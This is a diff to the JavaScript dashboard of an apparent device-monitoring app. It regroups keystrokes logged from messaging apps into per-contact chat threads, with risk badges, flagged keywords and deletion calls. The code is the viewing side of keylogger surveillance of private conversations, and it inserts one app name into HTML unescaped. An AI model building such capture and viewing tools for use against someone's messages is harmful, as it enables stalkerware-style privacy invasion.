@@ -4981,7 +4981,7 @@ function updateHighRiskAlerts(sessions) {
   `).join('');
 }
 
-// Render keystroke sessions list
+// Render keystroke sessions list - WhatsApp-style chat view
 function renderKeystrokeSessions() {
   const container = document.getElementById('keystrokeSessions');
   
@@ -5004,35 +5004,240 @@ function renderKeystrokeSessions() {
     return;
   }
   
-  container.innerHTML = keystrokeSessions.map(session => {
-    const appIcon = getAppIcon(session.appPackage);
-    const appIconClass = getAppIconClass(session.appPackage);
-    const previewText = session.messages?.slice(-3).map(m => m.text).join(' ') || '';
-    const timeRange = formatTimeRange(session.firstMessageTime, session.lastMessageTime);
+  // Group sessions by contact
+  const groupedByContact = {};
+  keystrokeSessions.forEach(session => {
+    const key = `${session.appName}::${session.contactName}`;
+    if (!groupedByContact[key]) {
+      groupedByContact[key] = {
+        appName: session.appName,
+        appPackage: session.appPackage,
+        contactName: session.contactName,
+        sessions: [],
+        totalMessages: 0,
+        lastActivity: session.lastMessageTime,
+        highestRisk: session.riskLevel
+      };
+    }
+    groupedByContact[key].sessions.push(session);
+    groupedByContact[key].totalMessages += session.messageCount || 0;
+    if (new Date(session.lastMessageTime) > new Date(groupedByContact[key].lastActivity)) {
+      groupedByContact[key].lastActivity = session.lastMessageTime;
+    }
+    if (session.riskLevel === 'HIGH' || (session.riskLevel === 'MEDIUM' && groupedByContact[key].highestRisk !== 'HIGH')) {
+      groupedByContact[key].highestRisk = session.riskLevel;
+    }
+  });
+  
+  // Sort by last activity
+  const sortedGroups = Object.values(groupedByContact).sort((a, b) => 
+    new Date(b.lastActivity) - new Date(a.lastActivity)
+  );
+  
+  container.innerHTML = sortedGroups.map(group => {
+    const appIcon = getAppIcon(group.appPackage);
+    const appIconClass = getAppIconClass(group.appPackage);
+    const timeRange = formatTimeRange(group.sessions[0]?.firstMessageTime, group.lastActivity);
+    
+    // Get all messages from all sessions
+    const allMessages = group.sessions
+      .flatMap(s => s.messages || [])
+      .sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
+    
+    // Get preview of last messages
+    const previewMessages = allMessages.slice(-3).map(m => m.text).join(' ');
     
     return `
-      <div class="keystroke-session-card ${session.riskLevel.toLowerCase()}-risk" 
-           onclick="openKeystrokeSession('${session.sessionId}')">
-        <div class="session-header">
-          <div class="session-app-info">
-            <div class="session-app-icon ${appIconClass}">
-              <i class="${appIcon}"></i>
-            </div>
-            <div>
-              <div class="session-app-name">${escapeHtml(session.appName)}</div>
-              <div class="session-contact-name">${escapeHtml(session.contactName)}</div>
-            </div>
+      <div class="keystroke-chat-card ${group.highestRisk.toLowerCase()}-risk" 
+           onclick="openChatThread('${encodeURIComponent(group.appName)}', '${encodeURIComponent(group.contactName)}')">
+        <div class="chat-header">
+          <div class="chat-avatar ${appIconClass}">
+            <i class="${appIcon}"></i>
           </div>
-          <span class="session-risk-badge ${session.riskLevel.toLowerCase()}">${session.riskLevel}</span>
+          <div class="chat-info">
+            <div class="chat-name">${escapeHtml(group.contactName)}</div>
+            <div class="chat-app">${escapeHtml(group.appName)}</div>
+          </div>
+          <div class="chat-meta">
+            <span class="chat-time">${timeRange}</span>
+            <span class="chat-count">${group.totalMessages} msg</span>
+          </div>
+          <button class="btn-delete-chat" onclick="event.stopPropagation(); deleteChat('${encodeURIComponent(group.appName)}', '${encodeURIComponent(group.contactName)}')" title="Delete all messages">
+            <i class="fas fa-trash"></i>
+          </button>
         </div>
-        <div class="session-preview">${escapeHtml(previewText.substring(0, 150))}${previewText.length > 150 ? '...' : ''}</div>
-        <div class="session-meta">
-          <span><i class="fas fa-comment"></i> ${session.messageCount} messages</span>
-          <span><i class="fas fa-clock"></i> ${timeRange}</span>
-        </div>
+        <div class="chat-preview">${escapeHtml(previewMessages.substring(0, 100))}${previewMessages.length > 100 ? '...' : ''}</div>
+        ${group.highestRisk !== 'LOW' ? `<span class="risk-badge ${group.highestRisk}">${group.highestRisk}</span>` : ''}
       </div>
     `;
   }).join('');
+}
+
+// Open chat thread modal - WhatsApp-style message view
+function openChatThread(appNameEncoded, contactNameEncoded) {
+  const appName = decodeURIComponent(appNameEncoded);
+  const contactName = decodeURIComponent(contactNameEncoded);
+  
+  // Find all sessions for this contact
+  const contactSessions = keystrokeSessions.filter(
+    s => s.appName === appName && s.contactName === contactName
+  );
+  
+  if (!contactSessions.length) return;
+  
+  const modal = document.getElementById('keystrokeDetailModal');
+  
+  // Get all messages from all sessions
+  const allMessages = contactSessions
+    .flatMap(s => (s.messages || []).map(m => ({
+      ...m,
+      sessionId: s.sessionId,
+      riskLevel: s.riskLevel,
+      flaggedKeywords: s.flaggedKeywords || []
+    })))
+    .sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
+  
+  const totalMessages = allMessages.length;
+  const firstSession = contactSessions[0];
+  const highestRisk = contactSessions.reduce((max, s) => 
+    s.riskLevel === 'HIGH' ? 'HIGH' : (s.riskLevel === 'MEDIUM' && max !== 'HIGH' ? 'MEDIUM' : max)
+  , 'LOW');
+  
+  // Populate modal header
+  document.getElementById('modalContactName').textContent = contactName;
+  document.getElementById('modalAppName').innerHTML = 
+    `<i class="${getAppIcon(firstSession.appPackage)}"></i> ${appName}`;
+  
+  const riskBadge = document.getElementById('modalRiskBadge');
+  riskBadge.textContent = highestRisk;
+  riskBadge.className = `risk-badge ${highestRisk}`;
+  
+  document.getElementById('modalMessageCount').innerHTML = 
+    `<i class="fas fa-comment"></i> ${totalMessages} messages`;
+  
+  const firstMsgTime = allMessages[0]?.timestamp;
+  const lastMsgTime = allMessages[allMessages.length - 1]?.timestamp;
+  document.getElementById('modalTimeRange').innerHTML = 
+    `<i class="fas fa-clock"></i> ${firstMsgTime ? new Date(firstMsgTime).toLocaleString() : ''} - ${lastMsgTime ? new Date(lastMsgTime).toLocaleTimeString() : ''}`;
+  
+  // Flagged keywords from all sessions
+  const allKeywords = [...new Set(contactSessions.flatMap(s => s.flaggedKeywords || []))];
+  const keywordsSection = document.getElementById('modalFlaggedKeywords');
+  const keywordTags = document.getElementById('keywordTags');
+  
+  if (allKeywords.length > 0) {
+    keywordsSection.classList.remove('hidden');
+    keywordTags.innerHTML = allKeywords.map(kw => 
+      `<span class="tag">${escapeHtml(kw)}</span>`
+    ).join('');
+  } else {
+    keywordsSection.classList.add('hidden');
+  }
+  
+  // Render messages in WhatsApp style with timestamps grouped
+  const threadContainer = document.getElementById('modalMessageThread');
+  let lastDate = null;
+  
+  threadContainer.innerHTML = allMessages.map((msg, index) => {
+    const msgDate = new Date(msg.timestamp);
+    const dateStr = msgDate.toLocaleDateString();
+    const timeStr = msgDate.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
+    
+    const isFlagged = msg.flaggedKeywords?.some(kw => 
+      msg.text.toLowerCase().includes(kw.toLowerCase())
+    );
+    
+    // Add date separator if new day
+    let dateSeparator = '';
+    if (dateStr !== lastDate) {
+      lastDate = dateStr;
+      dateSeparator = `<div class="date-separator"><span>${dateStr}</span></div>`;
+    }
+    
+    return `
+      ${dateSeparator}
+      <div class="message-bubble-wrapper">
+        <div class="message-bubble ${isFlagged ? 'flagged' : ''}">
+          <div class="message-text">${escapeHtml(msg.text)}</div>
+          <div class="message-time">${timeStr}</div>
+        </div>
+        <button class="btn-delete-msg" onclick="deleteMessage('${msg.sessionId}', ${index})" title="Delete message">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+    `;
+  }).join('');
+  
+  // Add delete all button at top of modal
+  const existingDeleteBtn = modal.querySelector('.btn-delete-all-chat');
+  if (existingDeleteBtn) existingDeleteBtn.remove();
+  
+  const deleteAllBtn = document.createElement('button');
+  deleteAllBtn.className = 'btn-delete-all-chat';
+  deleteAllBtn.innerHTML = '<i class="fas fa-trash"></i> Delete All Messages';
+  deleteAllBtn.onclick = () => deleteChat(appNameEncoded, contactNameEncoded);
+  modal.querySelector('.modal-header').appendChild(deleteAllBtn);
+  
+  // Show modal
+  modal.classList.remove('hidden');
+}
+
+// Delete all messages for a chat
+async function deleteChat(appNameEncoded, contactNameEncoded) {
+  const appName = decodeURIComponent(appNameEncoded);
+  const contactName = decodeURIComponent(contactNameEncoded);
+  
+  if (!confirm(`Delete all messages from "${contactName}" in ${appName}?`)) return;
+  
+  try {
+    const deviceId = getDeviceId(selectedDevice);
+    
+    // Find all sessions for this contact and delete them
+    const sessionsToDelete = keystrokeSessions.filter(
+      s => s.appName === appName && s.contactName === contactName
+    );
+    
+    for (const session of sessionsToDelete) {
+      await api(`/sync/keystrokes/${deviceId}/session/${session.sessionId}`, {
+        method: 'DELETE'
+      });
+    }
+    
+    showToast('Messages deleted successfully', 'success');
+    
+    // Refresh
+    keystrokePage = 1;
+    await fetchKeystrokeSessions();
+    closeKeystrokeModal();
+    
+  } catch (error) {
+    console.error('Failed to delete chat:', error);
+    showToast('Failed to delete messages', 'error');
+  }
+}
+
+// Delete single message (removes entire session for now)
+async function deleteMessage(sessionId, msgIndex) {
+  if (!confirm('Delete this message?')) return;
+  
+  try {
+    const deviceId = getDeviceId(selectedDevice);
+    
+    await api(`/sync/keystrokes/${deviceId}/session/${sessionId}`, {
+      method: 'DELETE'
+    });
+    
+    showToast('Message deleted', 'success');
+    
+    // Refresh
+    keystrokePage = 1;
+    await fetchKeystrokeSessions();
+    closeKeystrokeModal();
+    
+  } catch (error) {
+    console.error('Failed to delete message:', error);
+    showToast('Failed to delete message', 'error');
+  }
 }
 
 // Get app icon based on package name
@@ -5086,64 +5291,22 @@ function formatTimeRange(start, end) {
   return startDate.toLocaleDateString();
 }
 
-// Open keystroke session detail modal
+// Open keystroke session detail modal (legacy - kept for backwards compatibility)
 async function openKeystrokeSession(sessionId) {
   const session = keystrokeSessions.find(s => s.sessionId === sessionId);
   if (!session) return;
   
-  const modal = document.getElementById('keystrokeDetailModal');
-  
-  // Populate modal
-  document.getElementById('modalContactName').textContent = session.contactName;
-  document.getElementById('modalAppName').innerHTML = 
-    `<i class="${getAppIcon(session.appPackage)}"></i> ${session.appName}`;
-  
-  const riskBadge = document.getElementById('modalRiskBadge');
-  riskBadge.textContent = session.riskLevel;
-  riskBadge.className = `risk-badge ${session.riskLevel}`;
-  
-  document.getElementById('modalMessageCount').innerHTML = 
-    `<i class="fas fa-comment"></i> ${session.messageCount} messages`;
-  
-  document.getElementById('modalTimeRange').innerHTML = 
-    `<i class="fas fa-clock"></i> ${new Date(session.firstMessageTime).toLocaleString()} - ${new Date(session.lastMessageTime).toLocaleTimeString()}`;
-  
-  // Flagged keywords
-  const keywordsSection = document.getElementById('modalFlaggedKeywords');
-  const keywordTags = document.getElementById('keywordTags');
-  
-  if (session.flaggedKeywords?.length > 0) {
-    keywordsSection.classList.remove('hidden');
-    keywordTags.innerHTML = session.flaggedKeywords.map(kw => 
-      `<span class="tag">${escapeHtml(kw)}</span>`
-    ).join('');
-  } else {
-    keywordsSection.classList.add('hidden');
-  }
-  
-  // Render messages
-  const threadContainer = document.getElementById('modalMessageThread');
-  threadContainer.innerHTML = (session.messages || []).map(msg => {
-    const isFlagged = session.flaggedKeywords?.some(kw => 
-      msg.text.toLowerCase().includes(kw.toLowerCase())
-    );
-    
-    return `
-      <div class="message-bubble ${isFlagged ? 'flagged' : ''}">
-        <div class="message-text">${escapeHtml(msg.text)}</div>
-        <div class="message-time">${new Date(msg.timestamp).toLocaleTimeString()}</div>
-        ${msg.fieldType !== 'text' ? `<div class="message-type">${msg.fieldType}</div>` : ''}
-      </div>
-    `;
-  }).join('');
-  
-  // Show modal
-  modal.classList.remove('hidden');
+  // Use the new chat thread view
+  openChatThread(encodeURIComponent(session.appName), encodeURIComponent(session.contactName));
 }
 
 // Close keystroke modal
 function closeKeystrokeModal() {
-  document.getElementById('keystrokeDetailModal')?.classList.add('hidden');
+  const modal = document.getElementById('keystrokeDetailModal');
+  modal?.classList.add('hidden');
+  // Remove the delete all button
+  const deleteBtn = modal?.querySelector('.btn-delete-all-chat');
+  if (deleteBtn) deleteBtn.remove();
 }
 
 // Escape HTML for safe rendering
